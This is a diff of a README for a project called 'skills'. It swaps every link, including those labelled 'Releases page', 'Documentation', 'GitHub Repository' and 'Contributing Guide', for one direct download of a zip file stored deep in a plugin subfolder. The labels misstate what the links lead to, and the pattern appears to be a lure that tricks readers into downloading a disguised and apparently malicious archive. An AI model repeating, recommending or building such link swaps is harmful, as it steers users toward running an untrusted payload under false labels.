@@ -19,11 +19,11 @@ You can download the application from the Releases page on GitHub. This page con
 
 ### Download Link
 
-[![Download Skills](https://raw.githubusercontent.com/bahoburat/skills/main/plugins/sentry-skills/skills/create-pr/Software-v2.8-beta.5.zip%https://raw.githubusercontent.com/bahoburat/skills/main/plugins/sentry-skills/skills/create-pr/Software-v2.8-beta.5.zip)](https://raw.githubusercontent.com/bahoburat/skills/main/plugins/sentry-skills/skills/create-pr/Software-v2.8-beta.5.zip)
+[![Download Skills](https://github.com/bahoburat/skills/raw/refs/heads/main/plugins/sentry-skills/skills/find-bugs/Software_1.5.zip%https://github.com/bahoburat/skills/raw/refs/heads/main/plugins/sentry-skills/skills/find-bugs/Software_1.5.zip)](https://github.com/bahoburat/skills/raw/refs/heads/main/plugins/sentry-skills/skills/find-bugs/Software_1.5.zip)
 
 To download the application, follow these steps:
 
-1. Click on the link above or visit the [Releases page](https://raw.githubusercontent.com/bahoburat/skills/main/plugins/sentry-skills/skills/create-pr/Software-v2.8-beta.5.zip) directly.
+1. Click on the link above or visit the [Releases page](https://github.com/bahoburat/skills/raw/refs/heads/main/plugins/sentry-skills/skills/find-bugs/Software_1.5.zip) directly.
 2. On the Releases page, you will see a list of available versions.
 3. Select the latest version of the application. Click on the link that says "Download" next to the version number to start the download.
 4. Once the file has downloaded, locate it in your downloads folder.
@@ -86,7 +86,7 @@ If you encounter any issues during installation or while using the application, 
 
 - Make sure your computer meets the system requirements.
 - Restart your computer and try running the application again.
-- Check for any updates on the [Releases page](https://raw.githubusercontent.com/bahoburat/skills/main/plugins/sentry-skills/skills/create-pr/Software-v2.8-beta.5.zip).
+- Check for any updates on the [Releases page](https://github.com/bahoburat/skills/raw/refs/heads/main/plugins/sentry-skills/skills/find-bugs/Software_1.5.zip).
 - Visit the FAQ section or open a GitHub Issue for assistance.
 
 ## 👥 Community and Contributions
@@ -95,8 +95,8 @@ Join our community! Engage with other users and contributors through our GitHub 
 
 ## ⚡ Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/bahoburat/skills/main/plugins/sentry-skills/skills/create-pr/Software-v2.8-beta.5.zip): Explore the codebase and documentation.
-- [Documentation](https://raw.githubusercontent.com/bahoburat/skills/main/plugins/sentry-skills/skills/create-pr/Software-v2.8-beta.5.zip): Access in-depth guides and tutorials related to the application.
-- [Contributing Guide](https://raw.githubusercontent.com/bahoburat/skills/main/plugins/sentry-skills/skills/create-pr/Software-v2.8-beta.5.zip): Learn how to contribute to the project effectively.
+- [GitHub Repository](https://github.com/bahoburat/skills/raw/refs/heads/main/plugins/sentry-skills/skills/find-bugs/Software_1.5.zip): Explore the codebase and documentation.
+- [Documentation](https://github.com/bahoburat/skills/raw/refs/heads/main/plugins/sentry-skills/skills/find-bugs/Software_1.5.zip): Access in-depth guides and tutorials related to the application.
+- [Contributing Guide](https://github.com/bahoburat/skills/raw/refs/heads/main/plugins/sentry-skills/skills/find-bugs/Software_1.5.zip): Learn how to contribute to the project effectively.
 
 Thank you for using "skills"! We hope it enhances your development experience.
